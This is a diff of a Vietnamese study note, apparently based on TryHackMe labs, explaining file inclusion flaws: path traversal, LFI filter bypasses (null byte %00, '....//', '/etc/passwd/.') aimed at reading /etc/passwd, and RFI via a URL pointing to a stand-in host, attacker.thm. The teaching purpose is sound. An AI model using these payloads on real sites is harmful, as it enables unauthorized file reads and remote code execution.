@@ -8,9 +8,7 @@ của người dùng.
 
 File inclusion vul cho phép kẻ tấn công có thể xem các tệp trên máy chủ từ xa mà không cần nhìn thấy hoặc có thể thực thi các mã vào một mục tiêu bất kì trên 
 trang web. File inclusion vuls thường được tìm thấy và khai thác trong các ngôn ngữ lập trình khác nhau cho các ứng dụng web, chẳng hạn như là php
-được tạo và triển khai kém. Vấn đề chính ở đây là các xác thực đầu vào thường quá tin tưởng người dùng, vì vậy mà kẻ tấn công có thể kiểm soát chúng và thực hiện
-các hành vi xâm phạm. Chẳng hạn cụ thể như lập trình viên sử dụng các lệnh include, require, include_once, require_once, ... các lệnh này cho phép việc file
-hiện tại có thể gọi ra một file khác.
+được tạo và triển khai kém. Vấn đề chính ở đây là các xác thực đầu vào thường quá tin tưởng người dùng, vì vậy mà kẻ tấn công có thể kiểm soát chúng và thực hiệnm các hành vi xâm phạm. Chẳng hạn cụ thể như lập trình viên sử dụng các lệnh include, require, include_once, require_once, ... các lệnh này cho phép việc file hiện tại có thể gọi ra một file khác.
 
 _ Dấu hiệu để nhận biết trang web có thể tấn công file inclusion là đường link thường có dạng php?page hoặc php?file=...., ngoài ra việc các thông tin nhạy cảm
 của trang web bị tiết lộ.
@@ -20,8 +18,9 @@ của trang web bị tiết lộ.
 #### 2.1: Path Traversal
 
 _ Hay còn được biết đến với tên Directory traversal, đây là 1 lỗ hổng bảo mật cho phép kẻ tấn công đọc được tài nguyện hệ thống, như các file local trên máy chủ 
-đang chạy ứng dụng. Kẻ tấn công có thể khai thác lỗ hổng này bằng cách thao túng và lạm dụng url của ứng dụng web để định vị và truy cập các tệp hoặc thư mục được
-lưu trữ bên ngoài thư mục gốc của ứng dụng.
+đang chạy ứng dụng. Kẻ tấn công có thể khai thác lỗ hổng này bằng cách thao túng và lạm dụng url của ứng dụng web để định vị và truy cập các tệp hoặc thư mục
+được lưu trữ bên ngoài thư mục gốc của ứng dụng.
+
 __ Lỗ hổng này xủa ra khi đầu vào của người dùng được chuyển đến một hàm chẳng hạn như file_get_contents trong php. Điều quan trọng ta cần nhớ ở đây là đây không phải
 nguyên nhân chính gây ra lỗ hổng web, mà là do việc xác thực hoặc lọc đầu vào kém là nguyên nhân chính gây ra lỗ hổng.
 Trong php, ta có thể dùng file_get_contents để đọc nội dung của tệp cho phép ta đọc nội dung của 1 tệp hoặc 1 url và trả về cho ta kết quả dưới dạng chuỗi, cái này cũng khá
@@ -103,7 +102,76 @@ trả về như sau:
 
 
 Thông báo lỗi đã tiết lộ thông tin quan trọng. Bằng cách nhập THM làm đầu vào hay bất cứ cái gì khác mà kh phải là EN hay VN thì nó đã trả về lỗi cho ta là
-nó đang được thực hiện trong 
+nó đang được thực hiện trong hàm include với thư mục được chỉ định như ví dụ trước:  include(languages/THM.php) với đường dẫn đầy đủ đang là
+/var/www/html/THM-4/ . Để khai thác thì vẫn như ví dụ trước thôi: ../../../../etc/passwd
+
+Nhưng khi áp dụng đường dẫn trên ta vẫn nhận được lỗi: 
+
+![image](https://user-images.githubusercontent.com/104350480/222919069-3f5d895a-868a-4cc3-bba7-8e4f33050451.png)
+
+Rõ ràng thì chức năng include đã thực thi việc thêm .php ở cuối file thành /passwd.php, vì vậy nó trả về lỗi sai, để bypass thì ta có thể sử dụng NULL byte,
+tức có thể thêm vào cuối như %00 hoặc 0x00 ở dạng hex với dữ liệu do người dùng cung cấp để kết thúc chuỗi. Ứng dụng web sẽ bỏ qua bất kì thứ gì xuất hiện
+sau NULL byte mà cụ thể ở đây là .php:
+include("languages/../../../../../etc/passwd%00").".php"); sẽ tương đương với: include("languages/../../../../../etc/passwd");
+
+__ Tuy nhiên thì trick này sẽ chỉ được sử dụng với các phiên bản php dưới 5.3.4, tức là biết cho vui thôi :))
+
+Chẳng hạn áp dụng cho lab3 trên tryhackme: ta dùng đường dẫn: **/lab3.php?file=../../../../etc/passwd%00** để giải quyết sau khi đã thấy lỗi trả về:
+
+![image](https://user-images.githubusercontent.com/104350480/222919561-4dd1cda9-90dc-4d2e-a8d8-c009b4340be7.png)
+
+__ Kĩ thuật này cũng sử dụng tương tự được ở lab4 khi mà dev quyết định filter /etc/passwd, thì kĩ thuật null byte cũng là 1 cách có thể áp dụng được,
+ngoài ra ta có thể áp dụng thêm kĩ thuật nữa ở đây là dùng 1 lệnh vô nghĩa : cd . , tức chỉ định thư mục hiện tại để bypass, mình cũng đếch hiểu lm nhưng mà
+nó dùng như thế này: thay vì truyền null byte vào cuối để bypass thì ta truyền: /etc/passwd/. để bypass.
+
+__ Tiếp theo, thì là một lỗi nữa là dev có filter ../ nhưng mà filter kh đệ quy nên ta có thể bypass để thực hiện lab5:
+
+![image](https://user-images.githubusercontent.com/104350480/222920047-e8b1bd91-93f5-449c-9255-7b28623cc976.png)
+
+
+Bằng cách truyền: /lab5.php?file=....//....//....//....//etc/passwd
+
+
+__ Cuối cùng ở phần này ta sẽ thảo luận về việc trường hợp dev buộc phần include phải bao gồm 1 vị trí đã định sẵn như:
+**http://webapp.thm/index.php?lang=languages/EN.php** , thì để khai thác điều này chúng ta cần include thư mục như sau: 
+?lang=languages/../../../../../etc/passwd .
+Chẳng hạn như trong bài lab6 là: THM-profile/../../../../../etc/passwd
+
+![image](https://user-images.githubusercontent.com/104350480/222920847-08c21cc5-c96d-4259-8e87-609af80474a5.png)
+
+## 2.3: Remote file inclusion - RFI
+
+__ Remtoe file inclusion là 1 kĩ thuật đọc và thực thi file từ xa (thông thường qua include). Giống như LFI, RFI xảy ra khi xác thực hay lọc đầu vào kh đúng
+cách, nhưng nguy hiểm hơn nhiều, cho phép kẻ tấn công đưa 1 url bên ngoài vào chức năng include. Một yêu cầu với RFI là option **allow_url_fopen** cần được bật.
+
+__ Rủi ro của rfi rõ ràng là cao hơn nhiều so với lfi, nó cho phép kẻ tấn công giành được thực thi lệnh từ xa trên máy chủ, các hậu quả của rfi bao gồm:
+- Tiết lộ thông tin nhạy cảm.
+- xss
+- Denial of service(dos)
+
+__ Máy chủ bên ngoài phải liên lạc được máy chủ ứng dụng để tấn công LFI thành công, nơi kẻ tấn công lưu trữ các tệp độc hại trên máy chủ của họ. Sau đó, tệp
+độc hại này được đưa vào hàm include thông qua các yêu cầu http và lệnh include này sẽ đọc và thực thi các lệnh trên tệp độc hại truyền vào:
+Cụ thể sơ đồ sẽ như sau: 
+
+![image](https://user-images.githubusercontent.com/104350480/222921193-b10794cb-61f6-4f0a-b51f-24e875d7a848.png)
+
+__ Các bước tấn công rfi trong mô hình trên diễn ra như sau: 
+
+Chẳng hạn, kẻ tấn công lưu trữ file cmd.txt trong đó cmd.txt chứa thông báo 'Hello THM' 
+
+![image](https://user-images.githubusercontent.com/104350480/222921520-65bf6a4b-7823-43fd-beca-c0a8a0c5988c.png)
+
+
+Đầu tiên kẻ tấn công tiêm url độc hại trỏ đến máy chủ để tấn công, chẳng hạn như: **http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt**, nếu không
+có xác thực đầu vào thì url độc hại sẽ chuyển qua hàm include. Tiếp theo, máy chủ ứng dụng web sẽ gửi yêu cầu GET đến máy chủ độc hại để nạp file. Do đó tùy
+vào nội dung file thì nó sẽ thực thi lệnh php trng file và như ở đây trang web sẽ hiển thị 'Hello THM', tất nhiên là trong thực tế nếu rce được thì ta sẽ
+dùng các lệnh nguy hiểm hơn nhiều. Có lẽ tí sẽ demo bằng các bài lab hay hơn thì sẽ dễ hiểu hơn.
+
+## 3. Lab test kiến thức tryhackme
+
+## 4. Cách khắc phục
+
+Là 1 nhà phát triển ứng dụng, ta cần phải có nhận thức về các lỗ hổng web, cách tìm ra chúng
 
 
 
